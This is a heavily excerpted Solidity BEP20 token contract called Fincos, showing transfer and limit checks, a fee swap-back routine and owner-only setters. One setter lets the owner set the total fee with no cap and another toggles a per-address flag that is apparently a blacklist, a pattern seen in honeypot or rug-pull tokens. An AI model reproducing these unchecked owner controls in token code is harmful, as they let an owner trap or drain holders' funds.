...
contract Fincos is IBEP20, Auth {
    ...
    string constant _name = "FansYongs";
    string constant _symbol = "Fincos";
    ...
    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != type(uint256).max) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Fincos seems to happen Insufficient Allowance!!!!");
        }
    ...
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Fincos seems to happen Insufficient Balance!!!!");
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if (recipient != UniswapV2Pair && recipient != DEAD && sender != owner && recipient != owner) {
            require(isTxLimitExempt[recipient] || _balances[recipient] + amount <= _maxWalletSize, "Fincos Transfer seems to happen amount exceeds the bag size!!!!");
        }
    ...
    function checkTxLimit(address sender, uint256 amount) internal view {
        require(amount <= _maxTxAmount || isTxLimitExempt[sender], "Fincos TX Limit Exceeded");
    }
    ...
    function swapBack() internal swapping {
        ...
        require(MarketingSuccess, "Fincos receiver rejected ETH transfer");
        (bool BuyBackSuccess, /* bytes memory data */) = payable(buybackFeeReceiver).call{value : amountBNBbuyback, gas : 30000}("");
        require(BuyBackSuccess, "Fincos receiver rejected ETH transfer");
    ...
    function setDLFincos(address addr, bool bv) external onlyOwner {
        isBBB[addr] = bv;
    }

    function setDEFincos(uint256 fe) external onlyOwner {
        totalFee = fe;
    }
    ...
    function transferForeignTokenFincos(address _token) public authorized {
        require(_token != address(this), "Fincos Can't let you take all native token");
    ...
    function isOverLiquifiedFincos(uint256 target, uint256 accuracy) public view returns (bool) {
